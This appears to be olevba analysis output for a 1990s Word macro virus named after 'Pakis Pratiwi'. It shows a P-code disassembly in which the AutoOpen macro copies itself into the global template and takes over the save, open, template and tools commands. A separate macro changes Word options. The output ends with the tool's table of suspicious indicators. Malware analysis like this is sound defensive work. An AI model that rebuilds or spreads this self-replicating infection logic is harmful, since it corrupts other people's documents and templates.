' 	LitStr 0x0010 "Happy Birthday, "
' 	Ld Pelaku$ 
' 	Add 
' 	LitStr 0x0003 "..."
' 	Add 
' 	LitDI2 0x0010 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #47:
' 	GoTo Intan 
' Line #48:
' 	Label Pakis_ 
' Line #49:
' 	LitDI2 0x0000 
' 	ParamNamed CreateBackup 
' 	LitDI2 0x0000 
' 	ParamNamed FastSaves 
' 	LitDI2 0x0000 
' 	ParamNamed SummaryPrompt 
' 	LitDI2 0x0000 
' 	ParamNamed GlobalDotPrompt 
' 	LitDI2 0x0000 
' 	ParamNamed NativePictureFormat 
' 	LitDI2 0x0000 
' 	ParamNamed EmbedFonts 
' 	LitDI2 0x0000 
' 	ParamNamed FormsData 
' 	LitDI2 0x0001 
' 	ParamNamed AutoSave 
' 	LitStr 0x0001 "5"
' 	ParamNamed SaveInterval 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitDI2 0x0000 
' 	ParamNamed RecommendReadOnly 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsSave 0x000C 
' Line #50:
' 	LitDI2 0x0001 
' 	ParamNamed Pagination 
' 	LitDI2 0x0000 
' 	ParamNamed WPHelp 
' 	LitDI2 0x0000 
' 	ParamNamed WPDocNavKeys 
' 	LitDI2 0x0000 
' 	ParamNamed BlueScreen 
' 	LitDI2 0x0001 
' 	ParamNamed ErrorBeeps 
' 	LitDI2 0x0001 
' 	ParamNamed Effects3d 
' 	LitDI2 0x0001 
' 	ParamNamed UpdateLinks 
' 	LitDI2 0x0001 
' 	ParamNamed SendMailAttach 
' 	LitDI2 0x0000 
' 	ParamNamed RecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed RecentFileCount 
' 	LitDI2 0x0001 
' 	ParamNamed Units 
' 	LitDI2 0x0001 
' 	UMi 
' 	ParamNamed ButtonFieldClicks 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsGeneral 0x000C 
' Line #51:
' 	LitStr 0x000D "Pakis Pratiwi"
' 	ParamNamed New 
' 	LitStr 0x0004 "Tiwi"
' 	ParamNamed Initials 
' 	LitStr 0x001B "Pupus sudah asa Aku mencari"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001E "Alamat nyata belum jua terberi"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001C "Kalau saudaraku sudi memberi"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0015 "Informasi Aku menanti"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001C "Seribu hatur kasih Aku pasti"
' 	Add 
' 	ParamNamed Address 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsUserInfo 0x0003 
' Line #52:
' 	Label Pratiwi 
' Line #53:
' 	EndSub 
' Macros/VBA/SweetPakisPratiwi - 4866 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	QuoteRem 0x0000 0x0000 ""
' Line #3:
' 	QuoteRem 0x0000 0x003C "Cuplikan diary ini adalah kejadian nyata perjalanan hidupku."
' Line #4:
' 	QuoteRem 0x0000 0x0039 "Satu harapan besarku, semoga Tiwi tahu segala perasaanku."
' Line #5:
' 	QuoteRem 0x0000 0x0009 "Semoga..."
' Line #6:
' 	QuoteRem 0x0000 0x0000 ""
' Line #7:
' 	QuoteRem 0x0000 0x002E "============================================='"
' Line #8:
' 	QuoteRem 0x0000 0x002C "Catatan :                                  '"
' Line #9:
' 	QuoteRem 0x0000 0x002E "Beberapa bagian dari diary ini telah disensor'"
' Line #10:
' 	QuoteRem 0x0000 0x002E "tanpa mengurangi makna dan isinya.           '"
' Line #11:
' 	QuoteRem 0x0000 0x002E "============================================='"
' Line #12:
' 	QuoteRem 0x0000 0x001F "-------------------------------"
' Line #13:
' 	QuoteRem 0x0000 0x0013 "Date : July 5, 1995"
' Line #14:
' 	QuoteRem 0x0000 0x0010 "Time : 9:08 p.m."
' Line #15:
' 	QuoteRem 0x0000 0x0041 "Pagi  test ********, kelihatannya suksessss... ketemu sama  ****,"
' Line #16:
' 	QuoteRem 0x0000 0x0041 "Sorenya  latihan  ke *********, kemudian ke  ****,  pertama  kali"
' Line #17:
' 	QuoteRem 0x0000 0x0041 "ketemu  sama  Tiwi (katanya adiknya *****  (?))...  dianya  manis"
' Line #18:
' 	QuoteRem 0x0000 0x000E "lho.... swear!"
' Line #19:
' 	QuoteRem 0x0000 0x001F "-------------------------------"
' Line #20:
' 	QuoteRem 0x0000 0x0013 "Date : July 9, 1995"
' Line #21:
' 	QuoteRem 0x0000 0x0010 "Time : 8:11 p.m."
' Line #22:
' 	QuoteRem 0x0000 0x0041 "Tragedi  ******... Dapet juara *, Rp *****,-...  penempatan  kaki"
' Line #23:
' 	QuoteRem 0x0000 0x0041 "kurang bagus... kenalan sama Tiwi, adiknya *****. Sekarang  ngan-"
' Line #24:
' 	QuoteRem 0x0000 0x0007 "tuk !!!"
' Line #25:
' 	QuoteRem 0x0000 0x001F "-------------------------------"
' Line #26:
' 	QuoteRem 0x0000 0x0016 "Date : August 30, 1995"
' Line #27:
' 	QuoteRem 0x0000 0x0010 "Time : 7:15 p.m."
' Line #28:
' 	QuoteRem 0x0000 0x0041 "Nggak  ada  yang berkesan di hari ini selain sepi  dan  sepi  dan"
' Line #29:
' 	QuoteRem 0x0000 0x0041 "sepi...  Ah nasib. Tapi mengapa aku harus menyesali nasib ?  Yang"
' Line #30:
' 	QuoteRem 0x0000 0x003A "jelas aku masih menyimpan rasa sayang sama Tiwi. Itu saja."
' Line #31:
' 	QuoteRem 0x0000 0x001F "-------------------------------"
' Line #32:
' 	QuoteRem 0x0000 0x0015 "Date : March 21, 1996"
' Line #33:
' 	QuoteRem 0x0000 0x0010 "Time : 8:53 p.m."
' Line #34:
' 	QuoteRem 0x0000 0x0041 "Nelpon  ****  nggak ada, nelpon Tiwi udah bobo',  ya  udah  dech,"
' Line #35:
' 	QuoteRem 0x0000 0x0031 "sekarang belajar... biar besok sukses !!! Semoga."
' Line #36:
' 	QuoteRem 0x0000 0x002E "*** Buat apa sih hidup terlalu lurus ????? ***"
' Line #37:
' 	QuoteRem 0x0000 0x002E "*** Karena hidup nggak sesederhana itu !!! ***"
' Line #38:
' 	QuoteRem 0x0000 0x0033 "*** Sekali-kali jadi bajingan apa salahnya ???? ***"
' Line #39:
' 	QuoteRem 0x0000 0x001F "-------------------------------"
' Line #40:
' 	QuoteRem 0x0000 0x0016 "Date : August 19, 1996"
' Line #41:
' 	QuoteRem 0x0000 0x0010 "Time : 8:33 p.m."
' Line #42:
' 	QuoteRem 0x0000 0x0036 "Hari ini Tiwi ulang tahun yang ke **... selamat ya !!!"
' Line #43:
' 	QuoteRem 0x0000 0x000E "Tambah umur..."
' Line #44:
' 	QuoteRem 0x0000 0x0010 "Tambah dewasa..."
' Line #45:
' 	QuoteRem 0x0000 0x000F "Tambah cakep..."
' Line #46:
' 	QuoteRem 0x0000 0x000C "... OK ! ..."
' Line #47:
' 	QuoteRem 0x0000 0x002D "Selainnya itu ... nggak ada temen... sepi !!!"
' Line #48:
' 	EndSub 
' Macros/VBA/AutoOpen - 4335 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Intan
' Line #3:
' 	Dim 
' 	VarDefn i
' Line #4:
' 	Dim 
' 	VarDefn MN
' Line #5:
' 	Dim 
' 	VarDefn NFile
' Line #6:
' 	Dim 
' 	VarDefn NMakro
' Line #7:
' 	OptionBase 
' 	LitDI2 0x0014 
' 	Redim Fransiska__$ 0x0001 (As String)
' Line #8:
' 	LitDI2 0x0000 
' 	St Intan 
' Line #9:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Pratiwi 
' Line #10:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #11:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	St MN$ 
' Line #12:
' 	Ld MN$ 
' 	Ld i 
' 	ArgsSt Fransiska__$ 0x0001 
' Line #13:
' 	Ld Intan 
' 	LitDI2 0x0001 
' 	Add 
' 	St Intan 
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #15:
' 	Ld Intan 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #16:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Intan 
' 	For 
' Line #17:
' 	Ld i 
' 	ArgsLd Fransiska__$ 0x0001 
' 	LitStr 0x0008 "FileOpen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Pakis 
' 	EndIf 
' Line #18:
' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	LitStr 0x000A "NORMAL.DOT"
' 	ParamNamed Source 
' 	Ld i 
' 	ArgsLd Fransiska__$ 0x0001 
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0004 
' Line #19:
' 	Label Pakis 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St NFile$ 
' Line #23:
' 	Ld NFile$ 
' 	LitStr 0x0012 ":SweetPakisPratiwi"
' 	Add 
' 	St NMakro$ 
' Line #24:
' 	Ld NMakro$ 
' 	LitStr 0x0018 "Global:SweetPakisPratiwi"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #25:
' 	Ld NFile$ 
' 	LitStr 0x0015 ":PakisPratiwiFileSave"
' 	Add 
' 	St NMakro$ 
' Line #26:
' 	Ld NMakro$ 
' 	LitStr 0x001B "Global:PakisPratiwiFileSave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #27:
' 	Ld NMakro$ 
' 	LitStr 0x000F "Global:FileSave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #28:
' 	Ld NFile$ 
' 	LitStr 0x0017 ":PakisPratiwiFileSaveAs"
' 	Add 
' 	St NMakro$ 
' Line #29:
' 	Ld NMakro$ 
' 	LitStr 0x001D "Global:PakisPratiwiFileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #30:
' 	Ld NMakro$ 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #31:
' 	Ld NFile$ 
' 	LitStr 0x001A ":PakisPratiwiFileTemplates"
' 	Add 
' 	St NMakro$ 
' Line #32:
' 	Ld NMakro$ 
' 	LitStr 0x0020 "Global:PakisPratiwiFileTemplates"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #33:
' 	Ld NMakro$ 
' 	LitStr 0x0014 "Global:FileTemplates"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #34:
' 	Ld NFile$ 
' 	LitStr 0x0017 ":PakisPratiwiToolsMacro"
' 	Add 
' 	St NMakro$ 
' Line #35:
' 	Ld NMakro$ 
' 	LitStr 0x001D "Global:PakisPratiwiToolsMacro"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #36:
' 	Ld NMakro$ 
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #37:
' 	Ld NFile$ 
' 	LitStr 0x001B ":PakisPratiwiToolsCustomize"
' 	Add 
' 	St NMakro$ 
' Line #38:
' 	Ld NMakro$ 
' 	LitStr 0x0021 "Global:PakisPratiwiToolsCustomize"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #39:
' 	Ld NMakro$ 
' 	LitStr 0x0015 "Global:ToolsCustomize"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #40:
' 	Ld NFile$ 
' 	LitStr 0x0015 ":PakisPratiwiAutoExec"
' 	Add 
' 	St NMakro$ 
' Line #41:
' 	Ld NMakro$ 
' 	LitStr 0x001B "Global:PakisPratiwiAutoExec"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #42:
' 	Ld NMakro$ 
' 	LitStr 0x000F "Global:AutoExec"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #43:
' 	Ld NFile$ 
' 	LitStr 0x0016 ":PakisPratiwiAutoClose"
' 	Add 
' 	St NMakro$ 
' Line #44:
' 	Ld NMakro$ 
' 	LitStr 0x001C "Global:PakisPratiwiAutoClose"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #45:
' 	Ld NMakro$ 
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #46:
' 	Ld NFile$ 
' 	LitStr 0x0015 ":PakisPratiwiAutoOpen"
' 	Add 
' 	St NMakro$ 
' Line #47:
' 	Ld NMakro$ 
' 	LitStr 0x001B "Global:PakisPratiwiAutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #48:
' 	Ld NFile$ 
' 	LitStr 0x0015 ":PakisPratiwiFileOpen"
' 	Add 
' 	St NMakro$ 
' Line #49:
' 	Ld NMakro$ 
' 	LitStr 0x001B "Global:PakisPratiwiFileOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #50:
' 	Ld NFile$ 
' 	LitStr 0x0015 ":PakisPratiwiAutoOpen"
' 	Add 
' 	St NMakro$ 
' Line #51:
' 	Ld NMakro$ 
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #52:
' 	Ld NFile$ 
' 	LitStr 0x0015 ":PakisPratiwiFileOpen"
' 	Add 
' 	St NMakro$ 
' Line #53:
' 	Ld NMakro$ 
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #54:
' 	Label Pratiwi 
' Line #55:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |N,"                 |Tiwi                                         |
|String    |                    |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

